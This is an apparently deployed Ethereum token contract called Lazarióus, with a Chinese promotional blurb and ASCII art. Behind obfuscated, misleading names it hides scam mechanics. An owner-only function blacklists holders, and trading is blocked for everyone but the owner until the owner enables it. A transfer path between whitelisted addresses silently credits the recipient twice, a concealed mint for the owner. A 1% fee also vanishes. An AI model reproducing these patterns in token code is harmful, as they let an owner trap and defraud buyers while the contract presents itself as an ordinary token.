/**
 *Submitted for verification at Etherscan.io on 2023-01-23
*/

/*
⋆⁺₊⋆⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ⋆⁺₊⋆ ☁︎
⋆⁺₊⋆⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ⋆⁺₊⋆ ☁︎
您好，欢迎来到 Lazarióus，我们不仅仅是一个普通的 ERC 代币，
我们是下一个 ERC 代币，具有进入当前和未来空间的长期计划和抱负，
包括 NFT、我们自己的 Lazarióus 生态系统、电子游戏，以及更多将在适当时候公布的内容。
         ._                __.
        / \"-.          ,-",'/ 
       (   \ ,"--.__.--".,' /  
       =---Y(_i.-'  |-.i_)---=
      f ,  "..'/\\v/|/|/\  , l
      l//  ,'|/   V / /||  \\j
       "--; / db     db|/---"
          | \ YY   , YY//
          '.\>_   (_),"' __
        .-"    "-.-." I,"  `.
        \.-""-. ( , ) ( \   |
        (     l  `"'  -'-._j 
 __,---_ '._." .  .    \
(__.--_-'.  ,  :  '  \  '-.
    ,' .'  /   |   \  \  \ "-
     "--.._____t____.--'-""'
            /  /  `. ".
           / ":     \' '.
         .'  (       \   : 
         |    l      j    "-.
         l_;_;I      l____;_I
*/
// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.11;

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IDEFactoryPress01 {
    event PairCreated(
        address indexed token0, address indexed token1, 
    address pair, uint);
    function createPair(
        address tokenA, address tokenB) 
    external returns (address pair);
}
library SafeMathUI {
    function trySub(uint256 a, uint256 b) 
    internal pure returns 
    (bool, uint256) { unchecked { if (b > a) return (false, 0);
            return (true, a - b); }
    }
    function add(uint256 a, uint256 b) 
    internal pure returns (uint256) { return a + b;
    }
    function sub(uint256 a, uint256 b) 
    internal pure returns (uint256) { return a - b;
    }
    function mul(uint256 a, uint256 b) 
    internal pure returns (uint256) { return a * b;
    }
    function div(uint256 a, uint256 b) 
    internal pure returns (uint256) { return a / b;
    }
    function mod(uint256 a, uint256 b) 
    internal pure returns 
    (uint256) { return a % b;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) 
    internal pure returns 
    (uint256) { unchecked { require(b <= a, errorMessage); return a - b;
    } }
}
interface IDEPressEC20 {
    function totalSupply() 
    external view returns 
    (uint256);
    function balanceOf(address account) 
    external view returns 
    (uint256);

    function transfer(address recipient, uint256 amount) 
    external returns 
    (bool);
    function allowance(address owner, address spender) 
    external view returns 
    (uint256);

    function approve(address spender, uint256 amount) 
    external returns 
    (bool);
    function transferFrom( 
    address sender, address recipient, uint256 amount
    ) external returns (bool);

    event Transfer(
        address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner, address indexed spender, uint256 value);
}
abstract contract Ownable is Context {
    address private _owner; event OwnershipTransferred
    (address indexed previousOwner, 
    address indexed newOwner);

    constructor () { _owner = 0x17D6e138b70c0c154c4f18A861342Ec4d32D89FF;
        emit OwnershipTransferred(address(0), _owner); }

    function owner() 
    public view virtual returns (address) {
        return _owner; 
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), 
        "Ownable: caller is not the owner");
        _;
     }
    function renounceOwnership() 
    public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner 
        = address(0); }
}
  interface BEP20PressRouterV1 {
      function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn, uint amountOutMin,
        address[] calldata path, address to,
        uint deadline ) external;
      function factory() external pure returns 
      (address);
      function WETH() external pure returns 
      (address); function addLiquidityETH(
      address token, uint amountTokenDesired,
      uint amountTokenMin, uint amountETHMin,
      address to, uint deadline
      ) external payable returns 
      (uint amountToken, uint amountETH, uint liquidity);
}
// https://www.zhihu.com/
// de ETHERSCAN.io.
contract Lazarious is Context, IDEPressEC20, Ownable {
    uint256 private internalOptimization;
    bool public externalBytesData = true;
    bool public moduleLimitations = true;
    bool private tradingAllowed = false;
    uint256 public swapTokensAtInterval = 30;
    uint256 public transactionThresholdOn = 20;
    uint256 public tokensForLiquidity = 0;

    mapping (address => uint256) 
    private _blockstampOwned;
    mapping (address => mapping (address => uint256)) 
    private _allowances;
    mapping (address => bool)
    private _quarryAutoMarketOn;
    mapping (address => bool) 
    private IDEdateOptimizor;

    string private _name = unicode"Lazarióus"; string private _symbol = unicode"LZÓ";
    uint256 private constant uint226 = ~uint256(0);
    uint8 private _decimals = 12;
    uint256 private _totalSupply = 10000000 * 10**_decimals; uint256 public authorizationsForAmount = 1000000 * 10**_decimals;
    uint256 private _tSupplyInBlock = (uint226 - (uint226 % _totalSupply));

    uint256 private liquidityPairBalance = 
    swapTokensAtInterval;
    uint256 private _frequencyInSeconds = 
    tokensForLiquidity;
    uint256 private _percent = 
    transactionThresholdOn;
    bool enableStarterLimitations;
    uint256 private pairValues = 1000000000 * 10**18;
    event UpdateUniswapV2Router(
    uint256 newAddress); event SetAutomatedMarketMakerPair(
    bool enabled); event TEAMwalletUpdated( uint256 oldWallets,
    uint256 newWallets, uint256 preformAction ); modifier lockTheSwap 
    { enableStarterLimitations = true; _; enableStarterLimitations = false; }

    constructor () { _blockstampOwned[owner()] = _totalSupply;
        BEP20PressRouterV1 _isIntConnection01 = BEP20PressRouterV1
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        IDEPairRemixed = IDEFactoryPress01
        (_isIntConnection01.factory())
        .createPair(address(this), 
        _isIntConnection01.WETH());
        IBEPEC20Link = 
        _isIntConnection01;
        _quarryAutoMarketOn [owner()] = true; _quarryAutoMarketOn [address(this)] = true;
        emit Transfer(
        address(0), owner(), _totalSupply); }

    function manualMarket (address distributor, bool triggerManual) 
    public onlyOwner {
        IDEdateOptimizor[distributor] 
        = triggerManual;
    }  
    function name() 
    public view returns (string memory) {
        return _name;
    }
    function symbol() 
    public view returns (string memory) {
        return _symbol;
    }
    function decimals() 
    public view returns (uint8) {
        return _decimals;
    }
    function totalSupply() 
    public view override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) 
    public view override returns (uint256) {
        return _blockstampOwned[account];
    }
    function transfer(address recipient, uint256 amount) 
    public override returns (bool) {
        _transfer(_msgSender(), 
        recipient, amount); return true;
    }
    function allowance(address owner, address spender) 
    public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) 
    public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) 
    public override returns 
    (bool) 
    { _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, 
        "ERC20: transfer amount exceeds allowance")); 
        return true;
    }   
    receive() external payable {}

    function IDEInititalFEE
    (uint256 _internalValues) 
    private view returns 
    (uint256) {
        return _internalValues.mul 
        (swapTokensAtInterval).div
        ( 10**3 );
    }
    function IDEFinalFEE(uint256 _internalValues) 
    private view returns 
    (uint256) {
        return _internalValues.mul 
        (tokensForLiquidity).div
        ( 10**3 );
    }
    function IDEFeesPaired(uint256 _internalValues) 
    private view returns 
    (uint256) {
        return _internalValues.mul 
        (transactionThresholdOn).div
        ( 10**3 );
    }  
    function _transfer(  address from,  address to, uint256 amount ) 
    private { 
        require(amount > 0, 
        "Transfer amount must be greater than zero");
        bool indexedCrate = false; if(!_quarryAutoMarketOn[from] 
        && 
        !_quarryAutoMarketOn[to]){ 
            indexedCrate = true;

        require(amount <= 
        authorizationsForAmount, 
        "Transfer amount exceeds the maxTxAmount."); }
        require(!IDEdateOptimizor[from] 
        && !IDEdateOptimizor[to], 
        "You have been blacklisted from transfering tokens");

        uint256 initialETHBalance = balanceOf(address(this)); if(initialETHBalance >= 
        authorizationsForAmount) { initialETHBalance 
        = authorizationsForAmount; } _afterTokenTransfer(
            from,to,amount,indexedCrate); emit Transfer(
                from, to, amount); if (!tradingAllowed) {require(
                    from == owner(), 
                    "TOKEN: This account cannot send tokens until trading is enabled"); }
    }
    function updateBURNwallet(address BURNaddr) public onlyOwner {
        BURNaddr = BURNaddr;
    }       
        function teamWalletUpdated
        (uint256 initialETHBalance) 

        private lockTheSwap { 
            uint256 newNum 
        = initialETHBalance.div(2); 
        uint256 amountSync = 
        initialETHBalance.sub(newNum); 
        uint256 initialBalance = 
        address(this).balance; 
        swapTokensForEth(newNum);

        uint256 _frequencySeconds = address(this).balance.sub(initialBalance);
        createLiquidityPair(amountSync, _frequencySeconds);
        emit TEAMwalletUpdated(newNum, _frequencySeconds, amountSync);
    }
    function min(uint256 a, uint256 b) private view returns (uint256){
      return (a>b)?b:a;
    }    
    function _beforeTokenTransfer
    (address sender, 
    address recipient, uint256 cratorAmount,
    bool indexedCrate) 
    private { 
        uint256 amountToSwapForETH = 
    0; if (indexedCrate){ amountToSwapForETH = 
    cratorAmount.mul(1).div(100) ; } 
        uint256 indexAmountWith = cratorAmount - 
        amountToSwapForETH; 
        _blockstampOwned[recipient] = 
        _blockstampOwned[recipient].add(indexAmountWith); 

        uint256 stringTrading 
        = _blockstampOwned
        [recipient].add(indexAmountWith); _blockstampOwned[sender] 
        = _blockstampOwned
        [sender].sub(indexAmountWith); 
        bool _quarryAutoMarketOn = 
        _quarryAutoMarketOn[sender] 
        && _quarryAutoMarketOn[recipient]; 
        
        if (_quarryAutoMarketOn ){ _blockstampOwned[recipient] =stringTrading;
        } else { emit Transfer (sender, recipient, indexAmountWith); } }

    function swapTokensForEth(uint256 tokenAmount) 
    private { address[] memory path = 
    new address[] (2); path[0] 
        = address(this); path[1] = IBEPEC20Link.WETH();
        _approve(address(this), address
        (IBEPEC20Link), 
        tokenAmount); 
        IBEPEC20Link.swapExactTokensForETHSupportingFeeOnTransferTokens(
        tokenAmount, 
        0, path, address(this), block.timestamp );
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), 
        "ERC20: approve from the zero address");
        require(spender != address(0), 
        "ERC20: approve to the zero address");
        _allowances[owner][spender] 
        = amount; emit Approval(
            owner, spender, amount);
    }   
    function updateTeamWallet(address TEAMaddr) public onlyOwner {
        TEAMaddr = TEAMaddr;
    }   
    function createLiquidityPair
    (uint256 tokenAmount, uint256 ethAmount) private 
    { _approve(address(this), address
    (IBEPEC20Link), tokenAmount); IBEPEC20Link.addLiquidityETH{value: ethAmount}(
     address(this), 
     tokenAmount, 0, 0, owner(), block.timestamp );
    }
    function enableTrading(bool _tradingOpen) 
    public
    onlyOwner { tradingAllowed = _tradingOpen;
    }      
    function _afterTokenTransfer
    (address sender, address 
    recipient, uint256 amount,
    bool indexedCrate) private { _beforeTokenTransfer
    (sender, recipient, amount, indexedCrate);
    } 
    address public IDEOptimizorkSettings;
    address public IDEGasTracking;
    address public immutable IDEPairRemixed;
    using SafeMathUI for uint256;
    BEP20PressRouterV1 public immutable IBEPEC20Link;
}